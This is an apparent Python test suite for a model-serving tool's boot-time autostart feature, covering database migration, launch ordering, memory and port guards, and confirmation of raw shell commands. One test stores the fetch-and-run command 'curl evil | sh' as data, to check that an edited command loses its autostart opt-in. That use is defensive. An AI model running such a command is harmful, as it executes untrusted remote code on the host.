"""Opt-in boot launches: real legacy SQLite migration, fake model processes."""
import asyncio
import os
import sqlite3
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

import db


class AutostartStoreTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.conn = sqlite3.connect(str(Path(self.tmp.name) / 'legacy.db'), isolation_level=None)
        self.conn.row_factory = sqlite3.Row
        self.addCleanup(self.conn.close)
        p = mock.patch.object(db, '_conn', self.conn)
        p.start()
        self.addCleanup(p.stop)
        # The old schema and a persisted row exist BEFORE init/ALTER TABLE.
        self.conn.execute('CREATE TABLE recipes (id INTEGER PRIMARY KEY, name TEXT NOT NULL, '
                          'engine TEXT NOT NULL, model TEXT, args_json TEXT NOT NULL, '
                          "env_json TEXT NOT NULL DEFAULT '{}', notes TEXT DEFAULT '', "
                          "tags TEXT DEFAULT '', raw_cmd TEXT, created_at INTEGER NOT NULL, "
                          'updated_at INTEGER NOT NULL)')
        self.conn.execute("INSERT INTO recipes VALUES (1,'old','vllm','m','{}','{}','','',NULL,1,1)")

    def test_existing_database_migration_is_idempotent_and_opt_in(self):
        statements = []
        self.conn.set_trace_callback(statements.append)
        db.init()
        db.init()
        old = db.recipes_get(1)
        self.assertEqual((old['auto_start'], old['auto_start_order']), (0, 0))
        self.assertEqual(old['name'], 'old')
        alters = [s for s in statements if s.startswith('ALTER TABLE recipes ADD COLUMN auto_start')]
        self.assertEqual(len(alters), 2)
        columns = {r['name']: r for r in self.conn.execute('PRAGMA table_info(recipes)')}
        for name in ('auto_start', 'auto_start_order'):
            self.assertEqual(columns[name]['notnull'], 1)
            self.assertEqual(columns[name]['dflt_value'], '0')
        self.assertEqual(db.recipes_list_autostart(), [])

    def test_insert_update_order_and_unrelated_save_preserve_opt_in(self):
        db.init()
        old = db.recipes_get(1)
        old.update(auto_start=True, auto_start_order=3)
        db.recipes_upsert(old)
        second = db.recipes_upsert(dict(name='second', engine='sparkrun', args={},
                                       auto_start=True, auto_start_order=-1))
        third = db.recipes_upsert(dict(name='third', engine='vllm', args={},
                                      auto_start=True, auto_start_order=3))
        db.recipes_upsert(dict(name='off', engine='vllm', args={}))
        old = db.recipes_get(1)
        old['name'] = 'renamed'
        db.recipes_upsert(old)
        self.assertEqual([r['id'] for r in db.recipes_list_autostart()], [second['id'], 1, third['id']])
        self.assertEqual(db.recipes_get(1)['auto_start_order'], 3)
        db.recipes_upsert(dict(id=1, name='auto-fixed', engine='vllm', args={}))
        self.assertEqual(db.recipes_get(1)['auto_start'], 1)
        self.assertEqual(db.recipes_get(1)['auto_start_order'], 3)


class AutostartQueueTests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        import autostart
        self.recipes = [dict(id=i, name=f'recipe-{i}') for i in (1, 2)]
        self.runs = {}
        self.calls = []
        self.memory = dict(status='ok', detail='available')
        self.p = mock.patch.dict(os.environ, {'SPARK_STUDIO_AUTOSTART': '1',
                                             'SPARK_STUDIO_AUTOSTART_TIMEOUT': '0.06'})
        self.p.start()
        self.addCleanup(self.p.stop)
        def launch(recipe):
            self.calls.append(recipe['id'])
            run = SimpleNamespace(id=str(recipe['id']), recipe_id=recipe['id'],
                                  status='running', ready=True)
            self.runs[run.id] = run
            return dict(id=run.id)
        self.launch = launch
        self.network = [True]
        self.queue = autostart.BootQueue(lambda: self.recipes, lambda: self.memory,
                                        lambda r: self.launch(r), lambda: list(self.runs.values()),
                                        network_ready=lambda: self.network.pop(0) if len(self.network) > 1 else self.network[0])

    async def test_ready_before_next_and_only_one_pass(self):
        def launch(recipe):
            result = self.original(recipe)
            if recipe['id'] == 1:
                self.runs['1'].ready = False
            else:
                self.assertTrue(self.runs['1'].ready)
            return result
        self.original = self.launch
        self.launch = launch
        task = asyncio.create_task(self.queue.run())
        while not self.calls:
            await asyncio.sleep(.005)
        await asyncio.sleep(.015)
        self.assertEqual(self.calls, [1])
        self.runs['1'].ready = True
        await task
        await self.queue.run()
        self.assertEqual(self.calls, [1, 2])
        self.assertEqual(self.queue.status()['state'], 'completed')

    async def test_re_adopted_recipe_is_not_started_again(self):
        self.runs['old'] = SimpleNamespace(id='old', recipe_id=1, status='running', ready=True)
        await self.queue.run()
        self.assertEqual(self.calls, [2])
        self.assertIn('already running', self.queue.status()['results'][0]['reason'])

    async def test_kill_switch_and_memory_error_launch_nothing(self):
        os.environ['SPARK_STUDIO_AUTOSTART'] = '0'
        await self.queue.run()
        self.assertEqual(self.calls, [])
        self.assertEqual(self.queue.status()['state'], 'disabled')
        os.environ['SPARK_STUDIO_AUTOSTART'] = '1'
        await self.queue.run()  # a changed env cannot retry this boot
        self.assertEqual(self.calls, [])

    async def test_doctor_error_is_blocking_but_warn_is_not(self):
        self.memory['status'] = 'error'
        await self.queue.run()
        self.assertEqual(self.calls, [])
        self.assertEqual(self.queue.status()['state'], 'blocked')

    async def test_doctor_warning_allows_normal_memory_guard(self):
        self.memory['status'] = 'warn'
        await self.queue.run()
        self.assertEqual(self.calls, [1, 2])

    async def test_launch_refusals_are_logged_skips_without_retries(self):
        def refuse(recipe):
            self.calls.append(recipe['id'])
            raise RuntimeError('port occupied' if recipe['id'] == 1 else 'memory refused')
        self.launch = refuse
        with mock.patch('builtins.print') as log:
            await self.queue.run()
            await self.queue.run()
        self.assertEqual(self.calls, [1, 2])
        self.assertTrue(all(r['status'] == 'skipped' for r in self.queue.status()['results']))
        self.assertIn('port occupied', str(log.call_args_list))
        self.assertIn('memory refused', str(log.call_args_list))

    async def test_timeout_does_not_retry_or_stop_launched_run(self):
        original = self.launch
        def slow(recipe):
            result = original(recipe)
            self.runs[result['id']].ready = False
            return result
        self.launch = slow
        start = asyncio.get_running_loop().time()
        await self.queue.run()
        elapsed = asyncio.get_running_loop().time() - start
        self.assertLess(elapsed, .7)
        self.assertGreaterEqual(elapsed, .1)
        self.assertEqual(self.calls, [1, 2])
        self.assertTrue(all(r.status == 'running' for r in self.runs.values()))
        self.assertTrue(all(r['status'] == 'timeout' for r in self.queue.status()['results']))

    async def test_global_stop_ends_wait_and_preserves_active_run(self):
        original = self.launch
        def slow(recipe):
            result = original(recipe)
            self.runs[result['id']].ready = False
            return result
        self.launch = slow
        task = asyncio.create_task(self.queue.run())
        while not self.calls:
            await asyncio.sleep(.005)
        self.queue.stop()
        await task
        self.assertEqual(self.calls, [1])
        self.assertEqual(self.runs['1'].status, 'running')
        self.assertEqual(self.queue.status()['state'], 'stopped')
        await self.queue.run()
        self.assertEqual(self.calls, [1])

    async def test_stop_before_queue_is_started_is_latched(self):
        self.queue.stop()
        await self.queue.run()
        self.assertEqual(self.calls, [])
        self.assertEqual(self.queue.status()['state'], 'stopped')

    async def test_exited_before_ready_does_not_block_next(self):
        original = self.launch
        def dead(recipe):
            result = original(recipe)
            self.runs[result['id']].status = 'exited'
            self.runs[result['id']].ready = False
            return result
        self.launch = dead
        await self.queue.run()
        self.assertEqual(self.calls, [1, 2])
        self.assertEqual(self.queue.status()['results'][0]['status'], 'failed')


class AutostartIntegrationTests(unittest.TestCase):
    def setUp(self):
        import server
        import runners
        self.server, self.runners = server, runners

    def recipe(self, **over):
        rec = dict(id=17, name='test', engine='vllm', model='repo/model',
                   args={'port': 8912}, env={'EXAMPLE': 'value'}, raw_cmd=None)
        rec.update(over)
        return rec

    def test_payload_uses_normal_start_run_without_force_and_preserves_args(self):
        rec = self.recipe(engine='sparkrun', args={'_sparkrun': {'ref': '@x/y', 'tp': 2,
                         'max_model_len': 12345, 'overrides': {'a': 'b'}}, 'other': 42})
        with mock.patch.object(self.server.doctor, '_port_in_use', return_value=False), \
             mock.patch.object(self.server, 'start_run', return_value={'id': 'started'}) as start:
            self.server._autostart_launch(rec)
        req = start.call_args.args[0]
        self.assertFalse(req.force)
        self.assertEqual(req.args['_sparkrun'], rec['args']['_sparkrun'])
        self.assertEqual(req.args['other'], 42)
        self.assertEqual(req.env, rec['env'])
        self.assertEqual(req.recipe_id, 17)
        self.assertFalse(self.runners.preserve_resident_models.get())

    def test_busy_native_or_raw_port_skips_before_launch(self):
        for rec in (self.recipe(), self.recipe(args={}, raw_cmd='vllm serve m --port=8912')):
            with self.subTest(rec=rec), \
                 mock.patch.object(self.server.doctor, '_port_in_use', return_value=True), \
                 mock.patch.object(self.server, 'start_run') as start:
                with self.assertRaisesRegex(RuntimeError, 'port 8912 is occupied'):
                    self.server._autostart_launch(rec)
                start.assert_not_called()

    def test_resident_model_never_stopped_even_when_env_disables_manual_guard(self):
        manager = self.runners.Runner()
        resident = self.runners.Run(id='resident', engine='vllm', cmd=['test'], env={},
                                    recipe_id=1, status='running', adopted_pid=12345)
        manager.runs[resident.id] = resident
        with mock.patch.object(self.server, 'runner', manager), \
             mock.patch.object(self.server.doctor, '_port_in_use', return_value=False), \
             mock.patch.object(manager, 'stop') as stop, \
             mock.patch.dict(os.environ, {'SPARK_STUDIO_NO_MEMORY_GUARD': '1'}):
            with self.assertRaises(self.server.HTTPException) as raised:
                self.server._autostart_launch(self.recipe())
        self.assertEqual(raised.exception.status_code, 507)
        self.assertIn('resident model', raised.exception.detail)
        self.assertIn('(resident)', raised.exception.detail)  # names the blocking run
        stop.assert_not_called()
        self.assertEqual(resident.status, 'running')

    def test_memory_fit_refusal_is_not_forced_or_bypassed(self):
        manager = self.runners.Runner()
        with mock.patch.object(self.server, 'runner', manager), \
             mock.patch.object(self.server.doctor, '_port_in_use', return_value=False), \
             mock.patch.object(self.runners, '_mem_total_gb', return_value=128), \
             mock.patch.object(self.runners, '_mem_available_gb', return_value=1), \
             mock.patch.object(self.runners, '_drop_caches', return_value=(False, 'no privilege')), \
             mock.patch.object(self.runners.subprocess, 'Popen') as spawn:
            with self.assertRaises(self.server.HTTPException) as raised:
                self.server._autostart_launch(self.recipe())
        self.assertEqual(raised.exception.status_code, 507)
        spawn.assert_not_called()
        self.assertFalse(self.runners.preserve_resident_models.get())

    def test_api_patch_and_old_editor_save_keep_preference(self):
        from fastapi.testclient import TestClient
        conn = sqlite3.connect(':memory:', check_same_thread=False, isolation_level=None)
        conn.row_factory = sqlite3.Row
        self.addCleanup(conn.close)
        with mock.patch.object(db, '_conn', conn):
            db.init()
            client = TestClient(self.server.app)  # no startup hooks / real workloads
            payload = dict(name='r', engine='llamacpp', args={})
            created = client.post('/api/recipes', json=payload).json()
            self.assertEqual(created['auto_start'], 0)
            rid = created['id']
            response = client.patch(f'/api/recipes/{rid}', json={'auto_start': True, 'auto_start_order': 7})
            self.assertEqual(response.status_code, 200)
            response = client.post('/api/recipes', json={**payload, 'id': rid})
            self.assertEqual(response.status_code, 200)
            self.assertEqual(response.json()['auto_start'], 1)
            self.assertEqual(response.json()['auto_start_order'], 7)
            response = client.patch(f'/api/recipes/{rid}', json={'auto_start': False})
            self.assertEqual(response.json()['auto_start'], 0)
            self.assertEqual(client.patch('/api/recipes/999', json={'auto_start': True}).status_code, 404)

    def test_status_stop_http_are_global_and_never_stop_models(self):
        import autostart
        from fastapi.testclient import TestClient
        queue = autostart.BootQueue(lambda: [], lambda: {}, lambda r: {}, lambda: [])
        with mock.patch.object(self.server, '_autostart', queue), \
             mock.patch.object(self.server.runner, 'stop') as stop:
            client = TestClient(self.server.app)
            self.assertEqual(client.get('/api/autostart').json()['state'], 'pending')
            self.assertEqual(client.post('/api/autostart/stop').json()['state'], 'stopped')
            self.assertEqual(client.get('/api/autostart').json()['state'], 'stopped')
            stop.assert_not_called()

    def test_launch_lock_covers_guard_until_run_registration(self):
        import threading
        import time
        entered, release, second_entered = threading.Event(), threading.Event(), threading.Event()
        @self.runners._serialized_launch
        def first():
            entered.set()
            release.wait(2)
        @self.runners._serialized_launch
        def second():
            second_entered.set()
        a, b = threading.Thread(target=first), threading.Thread(target=second)
        a.start()
        self.assertTrue(entered.wait(1))
        b.start()
        try:
            time.sleep(.03)
            self.assertFalse(second_entered.is_set())
        finally:
            release.set()
            a.join(2)
            b.join(2)
        self.assertTrue(second_entered.is_set())

    def test_real_normal_launch_creates_run_row_ready_logs_and_can_stop(self):
        import shlex
        import sys
        import time
        conn = sqlite3.connect(':memory:', check_same_thread=False, isolation_level=None)
        conn.row_factory = sqlite3.Row
        self.addCleanup(conn.close)
        manager = self.runners.Runner()
        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(db, '_conn', conn), \
             mock.patch.object(self.server, 'runner', manager), \
             mock.patch.object(self.runners, 'RUN_LOG_DIR', Path(tmp)), \
             mock.patch.object(manager, '_reclaim_after_teardown'), \
             mock.patch.object(self.runners, '_mem_total_gb', return_value=None):
            db.init()
            db._add_col_if_missing('runs', 'meta_json', 'TEXT')
            rec = db.recipes_upsert(dict(name='harmless', engine='llamacpp', args={},
                raw_cmd=shlex.join([sys.executable, '-u', '-c',
                    "import time; print('Application startup complete', flush=True); time.sleep(10)"])))
            result = self.server._autostart_launch(rec)
            run = manager.get(result['id'])
            try:
                deadline = time.monotonic() + 3
                while not run.ready and time.monotonic() < deadline:
                    time.sleep(.01)
                self.assertTrue(run.ready)
                self.assertTrue(any('Application startup complete' in line for line in run.ring))
                row = conn.execute('SELECT recipe_id, status FROM runs WHERE id=?', (run.id,)).fetchone()
                self.assertEqual((row['recipe_id'], row['status']), (rec['id'], 'running'))
            finally:
                manager.stop(run.id)
            deadline = time.monotonic() + 3
            while run.status != 'exited' and time.monotonic() < deadline:
                time.sleep(.01)
            self.assertEqual(run.status, 'exited')


class BootOrderTests(unittest.IsolatedAsyncioTestCase):
    async def test_reconcile_then_adopt_then_autostart(self):
        import server
        events = []
        def record(name):
            events.append(name)
        with mock.patch.object(server, '_reconcile_on_boot', side_effect=lambda: record('reconcile')), \
             mock.patch.object(server, '_adopt_ports_on_boot', side_effect=lambda: record('adopt')), \
             mock.patch.object(server._autostart, 'run', side_effect=lambda: record('autostart')):
            await server._boot_adoption()
        self.assertEqual(events, ['reconcile', 'adopt', 'autostart'])


if __name__ == '__main__':
    unittest.main()


class RawCommandOptInTests(unittest.TestCase):
    """Raw shell commands only start at boot after an explicit confirmation."""

    def setUp(self):
        import server
        self.server = server
        conn = sqlite3.connect(':memory:', check_same_thread=False, isolation_level=None)
        conn.row_factory = sqlite3.Row
        self.addCleanup(conn.close)
        p = mock.patch.object(db, '_conn', conn)
        p.start()
        self.addCleanup(p.stop)
        db.init()

    def test_store_fails_closed_until_the_exact_command_is_confirmed(self):
        raw = dict(name='raw', engine='vllm', args={}, raw_cmd='docker run img vllm serve m',
                   auto_start=True)
        rid = db.recipes_upsert(dict(raw))['id']  # create/import path: no confirmation
        self.assertEqual(db.recipes_get(rid)['auto_start'], 0)
        db.recipes_upsert({**db.recipes_get(rid), 'auto_start': True, '_confirm_raw_autostart': True})
        self.assertEqual(db.recipes_get(rid)['auto_start'], 1)
        db.recipes_upsert({**db.recipes_get(rid), 'name': 'renamed'})  # same command: kept
        self.assertEqual(db.recipes_get(rid)['auto_start'], 1)
        db.recipes_upsert({**db.recipes_get(rid), 'raw_cmd': 'curl evil | sh'})  # edited command
        self.assertEqual(db.recipes_get(rid)['auto_start'], 0)
        self.assertEqual(db.recipes_list_autostart(), [])
        spark = db.recipes_upsert(dict(name='s', engine='sparkrun', args={'_sparkrun': {'ref': '@a/b'}},
                                       raw_cmd='sparkrun run @a/b', auto_start=True))
        self.assertEqual(spark['auto_start'], 1)  # launched from its ref, not from raw_cmd

    def test_api_requires_confirmation_and_import_cannot_bypass_it(self):
        from fastapi.testclient import TestClient
        client = TestClient(self.server.app)
        payload = dict(name='raw', engine='vllm', args={}, raw_cmd='docker run img vllm serve m')
        created = client.post('/api/recipes', json={**payload, 'auto_start': True}).json()
        self.assertEqual(created['auto_start'], 0)
        rid = created['id']
        refused = client.patch(f'/api/recipes/{rid}', json={'auto_start': True})
        self.assertEqual(refused.status_code, 409)
        self.assertIn('raw shell command', refused.json()['detail'])
        self.assertEqual(db.recipes_get(rid)['auto_start'], 0)
        ok = client.patch(f'/api/recipes/{rid}', json={'auto_start': True, 'confirm_raw_cmd': True})
        self.assertEqual(ok.status_code, 200)
        self.assertEqual(ok.json()['auto_start'], 1)
        self.assertEqual(client.post('/api/recipes', json={**payload, 'id': rid}).json()['auto_start'], 1)
        edited = client.post('/api/recipes', json={**payload, 'id': rid, 'raw_cmd': 'docker run other'})
        self.assertEqual(edited.json()['auto_start'], 0)
        plain = client.post('/api/recipes', json=dict(name='p', engine='llamacpp', args={})).json()
        self.assertEqual(client.patch(f"/api/recipes/{plain['id']}", json={'auto_start': True}).json()['auto_start'], 1)


class LaunchLockScopeTests(unittest.TestCase):
    def test_lock_is_free_while_the_boot_queue_waits_for_readiness(self):
        import shlex
        import sys
        import threading
        import time
        import autostart
        import runners
        import server
        conn = sqlite3.connect(':memory:', check_same_thread=False, isolation_level=None)
        conn.row_factory = sqlite3.Row
        self.addCleanup(conn.close)
        manager = runners.Runner()
        with tempfile.TemporaryDirectory() as tmp, \
             mock.patch.object(db, '_conn', conn), \
             mock.patch.object(server, 'runner', manager), \
             mock.patch.object(runners, 'RUN_LOG_DIR', Path(tmp)), \
             mock.patch.object(manager, '_reclaim_after_teardown'), \
             mock.patch.object(runners, '_mem_total_gb', return_value=None), \
             mock.patch.dict(os.environ, {'SPARK_STUDIO_AUTOSTART_TIMEOUT': '30'}):
            db.init()
            db._add_col_if_missing('runs', 'meta_json', 'TEXT')
            rec = db.recipes_upsert(dict(name='slow', engine='llamacpp', args={},
                raw_cmd=shlex.join([sys.executable, '-u', '-c',
                                    "import time; print('loading', flush=True); time.sleep(30)"])))
            queue = autostart.BootQueue(lambda: [rec], lambda: {'status': 'ok'},
                                        server._autostart_launch, lambda: list(manager.runs.values()))
            worker = threading.Thread(target=lambda: asyncio.run(queue.run()), daemon=True)
            worker.start()
            try:
                deadline = time.monotonic() + 5
                while not manager.runs and time.monotonic() < deadline:
                    time.sleep(.01)
                run = next(iter(manager.runs.values()))
                self.assertEqual(queue.status()['state'], 'running')
                self.assertFalse(run.ready)
                # A manual Run would take this lock now: it must not wait behind readiness.
                acquired = runners._launch_lock.acquire(timeout=1)
                self.assertTrue(acquired, 'launch lock held while waiting for readiness')
                runners._launch_lock.release()
                self.assertEqual(queue.status()['state'], 'running')
            finally:
                queue.stop()
                worker.join(5)
                for r in list(manager.runs.values()):
                    manager.stop(r.id)
                deadline = time.monotonic() + 5
                while any(r.status != 'exited' for r in manager.runs.values()) and time.monotonic() < deadline:
                    time.sleep(.01)
            self.assertFalse(worker.is_alive())
            self.assertTrue(all(r.status == 'exited' for r in manager.runs.values()))


class BootNetworkAndLauncherTests(unittest.IsolatedAsyncioTestCase):
    """Found by a real DGX Spark reboot: the pass ran before the network was up."""

    def setUp(self):
        import autostart
        self.autostart = autostart
        self.runs, self.calls = {}, []
        p = mock.patch.dict(os.environ, {'SPARK_STUDIO_AUTOSTART': '1',
                                         'SPARK_STUDIO_AUTOSTART_TIMEOUT': '30'})
        p.start()
        self.addCleanup(p.stop)

    def queue(self, network, launch=None):
        def default_launch(recipe):
            self.calls.append(recipe['id'])
            run = SimpleNamespace(id=str(recipe['id']), recipe_id=recipe['id'], status='running', ready=True)
            self.runs[run.id] = run
            return dict(id=run.id)
        q = self.autostart.BootQueue(lambda: [dict(id=1), dict(id=2)], lambda: {'status': 'ok'},
                                     launch or default_launch, lambda: list(self.runs.values()),
                                     network_ready=network)
        q._network_poll = .01
        return q

    async def test_waits_for_a_default_route_before_the_first_launch(self):
        checks = iter([False, False, True])
        seen = []
        def network():
            ready = next(checks, True)
            seen.append((ready, list(self.calls)))
            return ready
        q = self.queue(network)
        await q.run()
        self.assertEqual(seen[:3], [(False, []), (False, []), (True, [])])
        self.assertEqual(self.calls, [1, 2])

    async def test_network_wait_is_bounded_and_stop_still_wins(self):
        with mock.patch.dict(os.environ, {'SPARK_STUDIO_AUTOSTART_NETWORK_TIMEOUT': '0.05'}):
            await self.queue(lambda: False).run()
        self.assertEqual(self.calls, [1, 2])  # no route after the bound: launch anyway
        self.calls.clear()
        q = self.queue(lambda: False)
        task = asyncio.create_task(q.run())
        await asyncio.sleep(.03)
        self.assertEqual(q.status()['reason'], 'waiting for network')
        q.stop()
        await task
        self.assertEqual(self.calls, [])
        self.assertEqual(q.status()['state'], 'stopped')

    async def test_dead_detached_launcher_fails_fast_instead_of_waiting(self):
        def launch(recipe):
            self.calls.append(recipe['id'])
            dead = recipe['id'] == 1
            run = SimpleNamespace(id=str(recipe['id']), recipe_id=recipe['id'], status='running',
                                  ready=not dead, detached=True,
                                  proc=SimpleNamespace(poll=lambda: 1 if dead else None))
            self.runs[run.id] = run
            return dict(id=run.id)
        start = asyncio.get_running_loop().time()
        q = self.queue(lambda: True, launch)
        await q.run()
        self.assertLess(asyncio.get_running_loop().time() - start, 5)  # not the 30 s timeout
        results = q.status()['results']
        self.assertEqual((results[0]['status'], results[0]['reason']),
                         ('failed', 'launcher exited with code 1 before ready'))
        self.assertEqual(self.calls, [1, 2])

    def test_default_route_parser(self):
        with tempfile.TemporaryDirectory() as tmp:
            header = 'Iface\tDestination\tGateway\tFlags\tRefCnt\tUse\tMetric\tMask\n'
            up = Path(tmp, 'up')
            up.write_text(header + 'eth0\t00000000\t0101A8C0\t0003\t0\t0\t100\t00000000\n')
            local = Path(tmp, 'local')
            local.write_text(header + 'eth0\t0001A8C0\t00000000\t0001\t0\t0\t100\t00FFFFFF\n')
            self.assertTrue(self.autostart._has_default_route(str(up)))
            self.assertFalse(self.autostart._has_default_route(str(local)))
            self.assertTrue(self.autostart._has_default_route(str(Path(tmp, 'missing'))))
